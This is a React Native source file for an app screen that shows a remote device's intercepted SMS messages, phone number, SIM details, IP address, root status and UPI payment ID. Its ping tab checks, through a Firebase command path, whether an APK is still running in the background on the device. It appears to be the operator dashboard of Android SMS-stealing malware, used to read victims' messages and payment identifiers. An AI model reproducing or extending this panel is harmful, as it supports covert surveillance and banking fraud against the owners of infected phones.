import React, { useState, useCallback, useEffect, useRef } from 'react';
import {
  View, Text, StyleSheet, FlatList, TouchableOpacity,
  ScrollView, ActivityIndicator, Animated, Platform,
} from 'react-native';
import { useSafeAreaInsets } from 'react-native-safe-area-context';
import { useLocalSearchParams, router } from 'expo-router';
import { StatusBar } from 'expo-status-bar';
import { Feather } from '@expo/vector-icons';
import * as Haptics from 'expo-haptics';
import { fetchDevice, fetchDeviceSms, setDeviceValue, deleteDeviceValue } from '@/lib/firebase';
import { normalizeDevice, getBatteryNum, type NormalizedDevice } from '@/lib/normalizeDevice';

type Tab = 'sms' | 'info' | 'ping';

export default function DeviceDetailScreen() {
  const { id } = useLocalSearchParams<{ id: string }>();
  const insets = useSafeAreaInsets();

  const [device, setDevice] = useState<NormalizedDevice | null>(null);
  const [smsList, setSmsList] = useState<Array<{ key: string; from: string; body: string; date?: string }>>([]);
  const [loading, setLoading] = useState(true);
  const [tab, setTab] = useState<Tab>('sms');
  const [pinging, setPinging] = useState(false);
  const [pingResult, setPingResult] = useState<{ latencyMs: number; success: boolean } | null>(null);
  const pingPollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const load = useCallback(async () => {
    if (!id) return;
    try {
      const raw = await fetchDevice(id);
      if (raw) {
        setDevice(normalizeDevice(id, raw));
        const smsRaw = raw.sms as Record<string, any> | undefined;
        if (smsRaw) {
          const sorted = Object.entries(smsRaw)
            .map(([k, v]: any) => ({ key: k, from: v.from ?? v.sender ?? 'Unknown', body: v.body ?? v.message ?? '', date: v.date ?? v.timestamp }))
            .reverse();
          setSmsList(sorted);
        } else { setSmsList([]); }
      }
    } catch {}
    finally { setLoading(false); }
  }, [id]);

  useEffect(() => { load(); }, [load]);

  const handlePing = async () => {
    if (!id || pinging) return;
    setPinging(true);
    setPingResult(null);
    Haptics.impactAsync(Haptics.ImpactFeedbackStyle.Medium);
    const sentAt = Date.now();

    // Write ping to Firebase
    await setDeviceValue(`clients/${id}/webhookEvent/checkLiveness`, { text: 'ping' });

    // Poll for pong every 500ms, timeout 15s
    let attempts = 0;
    pingPollRef.current = setInterval(async () => {
      attempts++;
      try {
        const raw = await fetchDevice(id);
        const liveness = raw?.webhookEvent?.checkLiveness;
        if (liveness?.text === 'pong') {
          if (pingPollRef.current) clearInterval(pingPollRef.current);
          const latencyMs = Date.now() - sentAt;
          setPingResult({ success: true, latencyMs });
          setPinging(false);
          Haptics.notificationAsync(Haptics.NotificationFeedbackType.Success);
          // Clean up pong
          await deleteDeviceValue(`clients/${id}/webhookEvent/checkLiveness`);
        }
      } catch {}
      if (attempts >= 30) {
        if (pingPollRef.current) clearInterval(pingPollRef.current);
        setPingResult({ success: false, latencyMs: 0 });
        setPinging(false);
        Haptics.notificationAsync(Haptics.NotificationFeedbackType.Error);
      }
    }, 500);
  };

  useEffect(() => () => { if (pingPollRef.current) clearInterval(pingPollRef.current); }, []);

  if (loading) {
    return (
      <View style={[styles.centered, { paddingTop: insets.top }]}>
        <StatusBar style="dark" />
        <ActivityIndicator size="large" color="#7c3aed" />
      </View>
    );
  }

  if (!device) {
    return (
      <View style={[styles.centered, { paddingTop: insets.top }]}>
        <StatusBar style="dark" />
        <Feather name="alert-triangle" size={40} color="#f59e0b" />
        <Text style={styles.emptyTitle}>Device not found</Text>
        <TouchableOpacity style={styles.backBtn2} onPress={() => router.back()}>
          <Text style={styles.backBtn2Text}>← Go Back</Text>
        </TouchableOpacity>
      </View>
    );
  }

  return (
    <View style={[styles.container, { paddingTop: Platform.OS === 'web' ? 67 : 0 }]}>
      <StatusBar style="dark" />

      {/* Header */}
      <View style={[styles.header, { paddingTop: insets.top + 10 }]}>
        <TouchableOpacity style={styles.backBtn} onPress={() => router.back()} activeOpacity={0.7}>
          <Feather name="arrow-left" size={18} color="#6b5b7d" />
        </TouchableOpacity>
        <View style={styles.headerCenter}>
          <Text style={styles.headerTitle} numberOfLines={1}>{device.model}</Text>
          <View style={styles.statusRow}>
            <View style={[styles.statusDot, { backgroundColor: device.isOnline ? '#10b981' : '#9ca3af' }]} />
            <Text style={[styles.statusText, { color: device.isOnline ? '#10b981' : '#9ca3af' }]}>
              {device.isOnline ? 'Online' : 'Offline'}
            </Text>
          </View>
        </View>
        <View style={styles.backBtn} />
      </View>

      {/* Tab pills */}
      <View style={styles.tabs}>
        {(['sms', 'info', 'ping'] as Tab[]).map(t => (
          <TouchableOpacity
            key={t}
            style={[styles.tabPill, tab === t && styles.tabPillActive]}
            onPress={() => { setTab(t); Haptics.selectionAsync(); }}
          >
            <Feather
              name={t === 'sms' ? 'message-square' : t === 'info' ? 'info' : 'wifi'}
              size={14}
              color={tab === t ? '#fff' : '#6b5b7d'}
            />
            <Text style={[styles.tabLabel, tab === t && styles.tabLabelActive]}>
              {t === 'sms' ? 'Messages' : t === 'info' ? 'Info' : 'Ping'}
            </Text>
          </TouchableOpacity>
        ))}
      </View>

      {/* SMS Tab */}
      {tab === 'sms' && (
        <FlatList
          data={smsList}
          keyExtractor={s => s.key}
          contentContainerStyle={[styles.smsList, { paddingBottom: insets.bottom + (Platform.OS === 'web' ? 34 : 20) }]}
          scrollEnabled={smsList.length > 0}
          ListEmptyComponent={
            <View style={styles.emptyState}>
              <Feather name="message-square" size={36} color="#d8c8f0" />
              <Text style={styles.emptyTitle}>No messages</Text>
              <Text style={styles.emptySub}>SMS messages will appear here</Text>
            </View>
          }
          renderItem={({ item }) => (
            <View style={styles.smsCard}>
              <View style={styles.smsTop}>
                <Text style={styles.smsFrom} numberOfLines={1}>{item.from}</Text>
                {item.date ? <Text style={styles.smsDate}>{item.date}</Text> : null}
              </View>
              <Text style={styles.smsBody}>{item.body}</Text>
            </View>
          )}
        />
      )}

      {/* Info Tab */}
      {tab === 'info' && (
        <ScrollView
          contentContainerStyle={[styles.infoScroll, { paddingBottom: insets.bottom + (Platform.OS === 'web' ? 34 : 20) }]}
          showsVerticalScrollIndicator={false}
        >
          <InfoGrid device={device} />
        </ScrollView>
      )}

      {/* Ping Tab */}
      {tab === 'ping' && (
        <View style={styles.pingContainer}>
          <PingPanel device={device} pinging={pinging} pingResult={pingResult} onPing={handlePing} />
          <View style={{ flex: 1 }} />
          <Text style={[styles.pingNote, { paddingBottom: insets.bottom + (Platform.OS === 'web' ? 34 : 20) }]}>
            APK must be running in background for ping to work
          </Text>
        </View>
      )}
    </View>
  );
}

function InfoGrid({ device }: { device: NormalizedDevice }) {
  const tiles = [
    { label: 'MODEL', value: device.model, icon: 'smartphone' as const },
    { label: 'PHONE', value: device.phone || 'N/A', icon: 'phone' as const },
    { label: 'BATTERY', value: device.battery || 'N/A', icon: 'battery' as const, warn: getBatteryNum(device.battery) <= 20 },
    { label: 'ANDROID', value: device.androidV ? `v${device.androidV} (SDK ${device.sdkV ?? '?'})` : 'N/A', icon: 'cpu' as const },
    { label: 'IP ADDRESS', value: device.ip_address || 'N/A', icon: 'wifi' as const },
    { label: 'STORAGE', value: device.storage || 'N/A', icon: 'hard-drive' as const },
    { label: 'SIM 1', value: device.sim1 || 'N/A', icon: 'credit-card' as const },
    { label: 'SIM 2', value: device.sim2 || 'N/A', icon: 'credit-card' as const },
    { label: 'ROOT', value: device.isRoot !== undefined ? (device.isRoot ? 'Rooted ⚡' : 'Not rooted') : 'Unknown', icon: 'shield' as const },
    { label: 'SD CARD', value: device.isSdCard !== undefined ? (device.isSdCard ? 'Present 💾' : 'Not present') : 'Unknown', icon: 'server' as const },
    { label: 'JOINED', value: device.joined || 'N/A', icon: 'calendar' as const },
    { label: 'UPI ID', value: device.upi || 'N/A', icon: 'dollar-sign' as const },
  ].filter(t => t.value !== 'N/A');

  return (
    <View style={infoStyles.grid}>
      {tiles.map((t, i) => (
        <View key={i} style={infoStyles.tile}>
          <View style={infoStyles.tileIcon}>
            <Feather name={t.icon} size={14} color={t.warn ? '#f59e0b' : '#7c3aed'} />
          </View>
          <Text style={infoStyles.tileLabel}>{t.label}</Text>
          <Text style={[infoStyles.tileValue, t.warn && { color: '#f59e0b' }]} numberOfLines={2}>{t.value}</Text>
        </View>
      ))}
    </View>
  );
}

const infoStyles = StyleSheet.create({
  grid: { flexDirection: 'row', flexWrap: 'wrap', padding: 16, gap: 10 },
  tile: {
    width: '47%', backgroundColor: '#fff', borderRadius: 16, padding: 14,
    borderWidth: 1.5, borderColor: '#d8c8f0',
    shadowColor: '#7c3aed', shadowOffset: { width: 0, height: 1 }, shadowOpacity: 0.05, shadowRadius: 4, elevation: 1,
  },
  tileIcon: {
    width: 28, height: 28, borderRadius: 8, backgroundColor: '#f5efff',
    alignItems: 'center', justifyContent: 'center', marginBottom: 8,
  },
  tileLabel: { fontSize: 9, fontWeight: '700', color: '#6b5b7d', letterSpacing: 1, marginBottom: 4 },
  tileValue: { fontSize: 13, fontWeight: '600', color: '#2d1b4e' },
});

function PingPanel({ device, pinging, pingResult, onPing }: {
  device: NormalizedDevice;
  pinging: boolean;
  pingResult: { latencyMs: number; success: boolean } | null;
  onPing: () => void;
}) {
  const pulseAnim = useRef(new Animated.Value(1)).current;
  useEffect(() => {
    if (!pinging) return;
    const anim = Animated.loop(
      Animated.sequence([
        Animated.timing(pulseAnim, { toValue: 1.08, duration: 600, useNativeDriver: true }),
        Animated.timing(pulseAnim, { toValue: 1, duration: 600, useNativeDriver: true }),
      ])
    );
    anim.start();
    return () => { anim.stop(); pulseAnim.setValue(1); };
  }, [pinging]);

  return (
    <View style={pingStyles.container}>
      <Animated.View style={[pingStyles.btnWrap, { transform: [{ scale: pulseAnim }] }]}>
        <TouchableOpacity
          style={[pingStyles.pingBtn, pinging && pingStyles.pingBtnActive]}
          onPress={onPing}
          disabled={pinging}
          activeOpacity={0.85}
        >
          <Feather name="wifi" size={32} color="#fff" />
          <Text style={pingStyles.pingBtnLabel}>{pinging ? 'Pinging…' : 'PING'}</Text>
        </TouchableOpacity>
      </Animated.View>

      {pinging && <ActivityIndicator color="#7c3aed" style={{ marginTop: 24 }} />}

      {pingResult && !pinging && (
        <View style={[pingStyles.result, pingResult.success ? pingStyles.resultOk : pingStyles.resultFail]}>
          <Feather
            name={pingResult.success ? 'check-circle' : 'x-circle'}
            size={20}
            color={pingResult.success ? '#10b981' : '#ef4444'}
          />
          <Text style={[pingStyles.resultText, { color: pingResult.success ? '#10b981' : '#ef4444' }]}>
            {pingResult.success ? `${pingResult.latencyMs}ms — Device responded` : 'No response (15s timeout)'}
          </Text>
        </View>
      )}

      <Text style={pingStyles.deviceName}>{device.model}</Text>
      <Text style={pingStyles.deviceId} numberOfLines={1}>{device.id}</Text>
    </View>
  );
}

const pingStyles = StyleSheet.create({
  container: { flex: 1, alignItems: 'center', justifyContent: 'center', padding: 32 },
  btnWrap: { marginBottom: 32 },
  pingBtn: {
    width: 140, height: 140, borderRadius: 70,
    backgroundColor: '#7c3aed', alignItems: 'center', justifyContent: 'center', gap: 8,
    shadowColor: '#7c3aed', shadowOffset: { width: 0, height: 8 },
    shadowOpacity: 0.4, shadowRadius: 20, elevation: 10,
  },
  pingBtnActive: { backgroundColor: '#6d28d9' },
  pingBtnLabel: { color: '#fff', fontSize: 12, fontWeight: '800', letterSpacing: 2 },
  result: {
    flexDirection: 'row', alignItems: 'center', gap: 8,
    paddingHorizontal: 20, paddingVertical: 12, borderRadius: 16,
    marginBottom: 24, borderWidth: 1,
  },
  resultOk: { backgroundColor: '#10b98110', borderColor: '#10b98130' },
  resultFail: { backgroundColor: '#ef444410', borderColor: '#ef444430' },
  resultText: { fontSize: 14, fontWeight: '600' },
  deviceName: { fontSize: 16, fontWeight: '700', color: '#2d1b4e', marginTop: 8 },
  deviceId: { fontSize: 11, color: '#6b5b7d', marginTop: 4 },
});

const styles = StyleSheet.create({
  flex: { flex: 1 },
  container: { flex: 1, backgroundColor: '#f5f0ff' },
  centered: { flex: 1, backgroundColor: '#f5f0ff', alignItems: 'center', justifyContent: 'center', gap: 12 },

  header: {
    flexDirection: 'row', alignItems: 'center',
    paddingHorizontal: 16, paddingBottom: 12,
    backgroundColor: '#f5f0ff',
  },
  backBtn: {
    width: 38, height: 38, borderRadius: 12,
    backgroundColor: '#ecdbfd', borderWidth: 1, borderColor: '#d8c8f0',
    alignItems: 'center', justifyContent: 'center',
  },
  backBtn2: { marginTop: 12 },
  backBtn2Text: { color: '#7c3aed', fontWeight: '600', fontSize: 15 },
  headerCenter: { flex: 1, alignItems: 'center', paddingHorizontal: 8 },
  headerTitle: { fontSize: 16, fontWeight: '700', color: '#2d1b4e' },
  statusRow: { flexDirection: 'row', alignItems: 'center', gap: 5, marginTop: 2 },
  statusDot: { width: 6, height: 6, borderRadius: 3 },
  statusText: { fontSize: 11, fontWeight: '600', letterSpacing: 0.3 },

  tabs: {
    flexDirection: 'row', paddingHorizontal: 16, paddingBottom: 12, gap: 8,
  },
  tabPill: {
    flex: 1, flexDirection: 'row', alignItems: 'center', justifyContent: 'center',
    gap: 6, paddingVertical: 9, borderRadius: 14,
    backgroundColor: '#ecdbfd', borderWidth: 1.5, borderColor: '#d8c8f0',
  },
  tabPillActive: { backgroundColor: '#7c3aed', borderColor: '#7c3aed' },
  tabLabel: { fontSize: 12, fontWeight: '600', color: '#6b5b7d' },
  tabLabelActive: { color: '#fff' },

  smsList: { paddingHorizontal: 16, paddingTop: 4 },
  smsCard: {
    backgroundColor: '#fff', borderRadius: 16, padding: 14, marginBottom: 8,
    borderWidth: 1.5, borderColor: '#d8c8f0',
    shadowColor: '#7c3aed', shadowOffset: { width: 0, height: 1 }, shadowOpacity: 0.04, shadowRadius: 4, elevation: 1,
  },
  smsTop: { flexDirection: 'row', justifyContent: 'space-between', marginBottom: 6 },
  smsFrom: { fontSize: 12, fontWeight: '700', color: '#7c3aed', flex: 1 },
  smsDate: { fontSize: 10, color: '#9ca3af', marginLeft: 8 },
  smsBody: { fontSize: 14, color: '#2d1b4e', lineHeight: 20 },

  infoScroll: {},

  pingContainer: { flex: 1 },
  pingNote: { textAlign: 'center', fontSize: 12, color: '#9ca3af', paddingHorizontal: 24, paddingTop: 8 },

  emptyState: { alignItems: 'center', gap: 8, paddingTop: 60 },
  emptyTitle: { fontSize: 16, fontWeight: '600', color: '#2d1b4e' },
  emptySub: { fontSize: 13, color: '#6b5b7d' },
});
